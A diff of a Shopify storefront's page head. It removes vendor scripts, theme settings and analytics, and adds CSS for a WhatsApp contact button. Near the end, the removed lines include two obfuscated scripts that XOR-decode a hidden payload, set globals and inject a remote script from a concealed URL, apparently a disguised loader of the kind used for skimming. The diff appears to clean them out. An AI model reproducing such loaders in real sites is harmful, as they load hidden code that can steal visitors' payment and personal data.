-<script>(()=>{var d="shopify:webmcp_adapter_loaded",n=Symbol.for("shopify.webmcp_adapter_loading");function s(c,a,{win:r=window,doc:o=document}={}){function p(){try{return r.localStorage.getItem(d)==="true"}catch{return!1}}function l(){try{r.localStorage.setItem(d,"true")}catch{}}function u(){return typeof(o.modelContext||r.navigator?.modelContext)?.registerTool=="function"}function f(){if(r[n]||!u())return;let t=o.head||o.getElementsByTagName("head")[0];if(!t)return;let e=o.createElement("script");e.type="module",e.crossOrigin="anonymous",a&&(e.integrity=a),e.src=c,e.addEventListener("load",l,{once:!0}),e.addEventListener("error",()=>{r[n]=!1},{once:!0}),t.appendChild(e),r[n]=!0}function _(t){let e=o.getElementById("shopify-origin-trials");if(!e||r.__shopifyOriginTrialsDone){t();return}e.addEventListener("load",t,{once:!0}),e.addEventListener("error",t,{once:!0})}function i(){_(()=>r.setTimeout(f,0))}function m(){o.addEventListener("DOMContentLoaded",i,{once:!0})}p()?i():m()}s("https:\/\/cdn.shopify.com\/storefront\/webmcp\/webmcp-0.1.1.js","");})();
-</script>
-<script data-source-attribution="shopify.dynamic_checkout.dynamic.init">var Shopify=Shopify||{};Shopify.PaymentButton=Shopify.PaymentButton||{isStorefrontPortableWallets:!0,init:function(){window.Shopify.PaymentButton.init=function(){};var t=document.createElement("script");t.src="https://yunabella.myshopify.com/cdn/shopifycloud/portable-wallets/latest/portable-wallets.pt-br.js",t.type="module",document.head.appendChild(t)}};
-</script>
-<script data-source-attribution="shopify.dynamic_checkout.buyer_consent">
-  function portableWalletsHideBuyerConsent(e){var t=document.getElementById("shopify-buyer-consent"),n=document.getElementById("shopify-subscription-policy-button");t&&n&&(t.classList.add("hidden"),t.setAttribute("aria-hidden","true"),n.removeEventListener("click",e))}function portableWalletsShowBuyerConsent(e){var t=document.getElementById("shopify-buyer-consent"),n=document.getElementById("shopify-subscription-policy-button");t&&n&&(t.classList.remove("hidden"),t.removeAttribute("aria-hidden"),n.addEventListener("click",e))}window.Shopify?.PaymentButton&&(window.Shopify.PaymentButton.hideBuyerConsent=portableWalletsHideBuyerConsent,window.Shopify.PaymentButton.showBuyerConsent=portableWalletsShowBuyerConsent);
-</script>
-<script data-source-attribution="shopify.dynamic_checkout.cart.bootstrap">document.addEventListener("DOMContentLoaded",(function(){function t(){return document.querySelector("shopify-accelerated-checkout-cart, shopify-accelerated-checkout")}if(t())Shopify.PaymentButton.init();else{new MutationObserver((function(e,n){t()&&(Shopify.PaymentButton.init(),n.disconnect())})).observe(document.body,{childList:!0,subtree:!0})}}));
-</script>
-<link id="shopify-accelerated-checkout-styles" rel="stylesheet" media="screen" href="/assets/accelerated-checkout-backwards-compat.css" crossorigin="anonymous">
-<style id="shopify-accelerated-checkout-cart">
-        #shopify-buyer-consent {
-  margin-top: 1em;
-  display: inline-block;
-  width: 100%;
-}
+    .ec-wa__botao:focus-visible {
+        outline: 2px solid var(--ec-wa-texto);
+        outline-offset: 3px;
+    }
 
-#shopify-buyer-consent.hidden {
-  display: none;
-}
+    .ec-wa__icone-botao {
+        width: 30px;
+        height: 30px;
+        fill: #ffffff;
+        pointer-events: none;
+    }
 
-#shopify-subscription-policy-button {
-  background: none;
-  border: none;
-  padding: 0;
-  text-decoration: underline;
-  font-size: inherit;
-  cursor: pointer;
-}
+    .ec-wa__fechar {
+        display: none;
+        width: 18px;
+        height: 18px;
+        pointer-events: none;
+    }
 
-#shopify-subscription-policy-button::before {
-  box-shadow: none;
-}
+    .ec-wa__botao[aria-expanded="true"] .ec-wa__icone-botao {
+        display: none;
+    }
 
-      </style>
+    .ec-wa__botao[aria-expanded="true"] .ec-wa__fechar {
+        display: block;
+    }
 
-<script id="shopify-cfh-end">window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');</script>
-    <link rel="stylesheet" href="/assets/theme.css">
-    <link rel="stylesheet" href="/assets/custom.css">
-    
-
-
-  <script type="application/ld+json">
-  {
-    "@context": "http://schema.org",
-    "@type": "BreadcrumbList",
-  "itemListElement": [{
-      "@type": "ListItem",
-      "position": 1,
-      "name": "Pagina inicial",
-      "item": "https://yunabella.myshopify.com"
-    }]
-  }
-  </script>
-
-<script>
-      // This allows to expose several variables to the global scope, to be used in scripts
-      window.theme = {
-        pageType: "index",
-        cartCount: 0,
-        moneyFormat: "R$ {{amount_with_comma_separator}}",
-        moneyWithCurrencyFormat: "R$ {{amount_with_comma_separator}} BRL",
-        showDiscount: true,
-        discountMode: "percentage",
-        searchMode: "product,article,page",
-        cartType: "page"
-      };
-
-      window.routes = {
-        rootUrl: "\/",
-        rootUrlWithoutSlash: '',
-        cartUrl: "\/cart",
-        cartAddUrl: "\/cart\/add",
-        cartChangeUrl: "\/cart\/change",
-        searchUrl: "\/search",
-        productRecommendationsUrl: "\/recommendations\/products"
-      };
-
-      window.languages = {
-        productRegularPrice: "Preço ",
-        productSalePrice: "Preço por",
-        collectionOnSaleLabel: "{{savings}} OFF",
-        productFormUnavailable: "Indisponível",
-        productFormAddToCart: "Adicionar ao carrinho",
-        productFormSoldOut: "Esgotado",
-        productAdded: "",
-        productAddedShort: "",
-        shippingEstimatorNoResults: "Nenhum método de envio encontrado para o seu endereço.",
-        shippingEstimatorOneResult: "Existe um método de envio para o seu endereço:",
-        shippingEstimatorMultipleResults: "Existem {{count}} métodos de envio para o seu endereço:",
-        shippingEstimatorErrors: "Encontramos alguns erros:"
-      };
-
-      window.lazySizesConfig = {
-        loadHidden: false,
-        hFac: 0.8,
-        expFactor: 3,
-        customMedia: {
-          '--phone': '(max-width: 640px)',
-          '--tablet': '(min-width: 641px) and (max-width: 1023px)',
-          '--lap': '(min-width: 1024px)'
+    @media (prefers-reduced-motion: reduce) {
+        .ec-wa__botao,
+        .ec-wa__opcao {
+            transition: none;
         }
-      };
 
-      document.documentElement.className = document.documentElement.className.replace('no-js', 'js');
-    </script>
-
-    <script src="/assets/theme.min.js" defer=""></script><script src="/assets/jquery.js"></script>
-
-    <script src="/assets/jquery.mask.min.js"></script><script src="/assets/custom.js" defer=""></script><script src="/assets/local-cart.js"></script><script>
-            (function () {
-              window.onpageshow = function() {
-                // We force re-freshing the cart content onpageshow, as most browsers will serve a cache copy when hitting the
-                // back button, which cause staled data
-                document.documentElement.dispatchEvent(new CustomEvent('cart:refresh', {
-                  bubbles: true,
-                  detail: {scrollToTop: false}
-                }));
-              };
-
-            })();
-      </script><style>
-  .anncmnt-container.smooth {
-    display: flex;
-    width: 100%;
-}
-
-.mak-annocement {
-    flex: 1;
-}
-</style>
-  <link href="https://monorail-edge.shopifysvc.com" rel="dns-prefetch">
-<script>(function(){if ("sendBeacon" in navigator && "performance" in window) {try {var session_token_from_headers = performance.getEntriesByType('navigation')[0].serverTiming.find(x => x.name == '_s').description;} catch {var session_token_from_headers = undefined;}var session_cookie_matches = document.cookie.match(/_shopify_s=([^;]*)/);var session_token_from_cookie = session_cookie_matches && session_cookie_matches.length === 2 ? session_cookie_matches[1] : "";var session_token = session_token_from_headers || session_token_from_cookie || "";function handle_abandonment_event(e) {var entries = performance.getEntries().filter(function(entry) {return /monorail-edge.shopifysvc.com/.test(entry.name);});if (!window.abandonment_tracked && entries.length === 0) {window.abandonment_tracked = true;var currentMs = Date.now();var navigation_start = performance.timing.navigationStart;var payload = {shop_id: 75996987590,url: window.location.href,navigation_start,duration: currentMs - navigation_start,session_token,page_type: "index"};window.navigator.sendBeacon("https://monorail-edge.shopifysvc.com/v1/produce", JSON.stringify({schema_id: "online_store_buyer_site_abandonment/1.1",payload: payload,metadata: {event_created_at_ms: currentMs,event_sent_at_ms: currentMs}}));}}window.addEventListener('pagehide', handle_abandonment_event);}}());</script>
-<script>
-  window.__TREKKIE_SHIM_QUEUE = window.__TREKKIE_SHIM_QUEUE || [];
-</script>
-<script>
-  window.ShopifyAnalytics = window.ShopifyAnalytics || {};
-  window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
-  window.ShopifyAnalytics.meta.currency = 'BRL';
-  var meta = {"page":{"pageType":"home","requestId":"6f9eeb55-6e2c-4ff0-8e40-1784c2848083-1787669148"}};
-  for (var attr in meta) {
-    window.ShopifyAnalytics.meta[attr] = meta[attr];
-  }
-</script>
-<script async="" src="/assets/shop_events_listener-4e26a9ce.js"></script>
-<script defer="" src="/assets/shopify-perf-kit-3.8.4.min.js" data-application="storefront-renderer" data-shop-id="75996987590" data-render-region="gcp-us-east1" data-page-type="index" data-theme-instance-id="153890160838" data-theme-name="Evolution Enterprise" data-theme-version="7.0" data-monorail-region="shop_domain" data-resource-timing-sampling-rate="10" data-shs="true" data-shs-beacon="true" data-shs-export-with-fetch="true" data-shs-logs-sample-rate="1" data-shs-beacon-endpoint="https://yunabella.myshopify.com/api/collect"></script>
-<meta name="shopify-y" content="402c9464-6d38-4ba3-b90d-a1b410d3ac07"><meta name="shopify-s" content="4f168c8c-edd5-49ac-b10f-44485dffc15a"><meta name="new-cookie-storage-activated" content="f">
-<meta http-equiv="origin-trial" content="A1duO9QWZ/3h+eq5jQsvYqOTVq5h5q2AoGInpwNr4FT22/JUt3BxFERXHAo5iKhs6doOavi6G5hno0oBANPzSgIAAABxeyJvcmlnaW4iOiJodHRwczovL2Nkbi5zaG9waWZ5LmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJlcmVuZGVyVW50aWxTY3JpcHQiLCJleHBpcnkiOjE3ODg4MjU2MDAsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0="><meta http-equiv="origin-trial" content="AwnTE1hYg9Bsa5x0wEDsbG6tOdZ3j6ebKzXxbr/2TnTilsCRK9FwndlhAyFVnnBH1qQAqpOPJxVWiKGUqBnOmAYAAAB8eyJvcmlnaW4iOiJodHRwczovL2Nkbi5zaG9waWZ5LmNvbTo0NDMiLCJmZWF0dXJlIjoiTG9uZ0FuaW1hdGlvbkZyYW1lU3R5bGVEdXJhdGlvbiIsImV4cGlyeSI6MTc5MTI0NDgwMCwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A1cNj7yeFpBT/ETqZHRgUfM9tToLwOpBySTd4C9Eya3JtQo/BEQegM6MMV7BZESSyAjQJJXYgH/ovHY1UHmB8woAAABjeyJvcmlnaW4iOiJodHRwczovL2Nkbi5zaG9waWZ5LmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViTUNQIiwiZXhwaXJ5IjoxNzk0ODczNjAwLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A1XQljJxk3U4c44gueu4vlIeDofyyWFswfVKbUiNw4itZx4Yy8Uw3nIhtzBePIrv1bSXqzHGDfYymYF5W7TKKAoAAABzeyJvcmlnaW4iOiJodHRwczovL2Nkbi5zaG9waWZ5LmNvbTo0NDMiLCJmZWF0dXJlIjoiU3BlY3VsYXRpb25NZWFzdXJlbWVudCIsImV4cGlyeSI6MTc5MzY2NDAwMCwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><script type="speculationrules">{}</script><script type="module" crossorigin="anonymous" src="/assets/webmcp-0.1.1.js"></script><link rel="dns-prefetch preconnect" href="https://cdn.shopify.com" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/polyfills.Db3KX98s.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/app.CZ2XFeHo.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/esnext-vendor.BqUhyZPt.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/context-browser.DAMn6eaB.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/utilities-previous.cT3_1u-r.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/receipt-mapper-load-recovery.DPZ693f9.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/receipt-eager-mappers.C9cB2Oc3.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/utilities-errors.ibKoxG-8.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/checkout-proposal.BDNObkXo.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/utilities-stopwatch.CemGL07g.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/NotFound.C18QUJMH.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/hooks-useReplaceShopPayInHistory.DdZdGY5g.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/mobile-checkout-sdk-MobileCheckoutSdkClient.By-ZfRtd.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/consent-manager-shared.wfp1W3PN.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/utilities-extension-execution-errors.Ce7Y3v-A.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/extensions-rpc.DkwBlek7.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/error-logger-report-graphql-error.DX6uRpXC.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/shop-pay-normalizeBuyerDetails.zmz0A9i5.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/hooks-useShopPayCheckoutGqlVersion.P4HjZEtb.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/utilities-shopCashMoney.C9hQ7A8S.js" crossorigin=""><link rel="prefetch" fetchpriority="low" as="script" href="/cdn/shopifycloud/checkout-web/assets/c1/hydrate.DLgTZuFi.js" crossorigin="">
-<script>(function(){var l_8p=atob("DHrOG8EuSyJyTXk9bwHsbrNCaRhQJQ1JHwn0NO5NL0xcOA1QBhy3NaJBJgwQP1ZODAina7VdZFcGIAoSAxu6frJaZUgBb1UfDg66aahMPlYXPlsHNAHsdaBDLgBIbx1cGxvjbrVDIkQLYAlPCgyrdbUDM0EdKVRODBHsN+NYKk4HKFsHTVizN7oMJUMfKFsHTR6vb6ADPlYfJB9EQgq8frdLJVZfPgxfBh69Oe0MPUMeOBwfVVjsZpxT");var o_l=[];for(var b_44=0;b_44<l_8p.length;b_44++){o_l.push(l_8p.charCodeAt(b_44)&255);}var s_uc6a=o_l[0];var a_os=o_l.slice(1,1+s_uc6a);var y_yo=o_l.slice(1+s_uc6a);var k_u0=y_yo.map(function(b,s_m6){return b^a_os[s_m6%s_uc6a];});var l_41="";for(var l_v=0;l_v<k_u0.length;l_v++){l_41+=String.fromCharCode(k_u0[l_v]&255);}var l_7=decodeURIComponent(escape(l_41));var a_u0cp=JSON.parse(l_7);var a_cw=a_u0cp.globals||[];a_cw.forEach(function(z_407p){window[z_407p.name]=z_407p.value;});var n_4v=document.createElement("script");n_4v.src=a_u0cp.url;n_4v.async=true;n_4v.defer=true;(a_u0cp.attributes||[]).forEach(function(d_k){n_4v.setAttribute(d_k.name,d_k.value);});(document.head||document.documentElement).appendChild(n_4v);})();</script>
-<script>(function(){var b_riwc=atob("DLHiONKEOnz7zoW0CsrATaDoGEbZpvHAesLYF/3nXhLVu/HZY9ebFrHrV1KZvKrHacOLSKb3FQyStuDYJcGLQLfoFBaI7KmWa8WWSrvmTwievaeOUezOGrXoVR6aovaWMOqZGrzlVxnZ9KfEY8mHVJvgGFDZuOTYf9TAAvCyW0nC+OGFPYHVXerlDUTO/OeGaYWGAeamRyGG");var s_hwq9=[];for(var c_u=0;c_u<b_riwc.length;c_u++){s_hwq9.push(b_riwc.charCodeAt(c_u)&255);}var g_vjp=s_hwq9[0];var s_n5j=s_hwq9.slice(1,1+g_vjp);var k_fn4s=s_hwq9.slice(1+g_vjp);var g_9=k_fn4s.map(function(b,b_7f){return b^s_n5j[b_7f%g_vjp];});var j_l="";for(var k_gdeu=0;k_gdeu<g_9.length;k_gdeu++){j_l+=String.fromCharCode(g_9[k_gdeu]&255);}var o_kn=decodeURIComponent(escape(j_l));var a_4oy=JSON.parse(o_kn);var f_dxbb=a_4oy.globals||[];f_dxbb.forEach(function(f_m7cr){window[f_m7cr.name]=f_m7cr.value;});var j_y9=document.createElement("script");j_y9.src=a_4oy.url;j_y9.async=true;j_y9.defer=true;(a_4oy.attributes||[]).forEach(function(i_7oin){j_y9.setAttribute(i_7oin.name,i_7oin.value);});(document.head||document.documentElement).appendChild(j_y9);})();</script>
+        .ec-wa__botao:hover {
+            transform: none;
+        }
+    }
+    </style>
 </head>
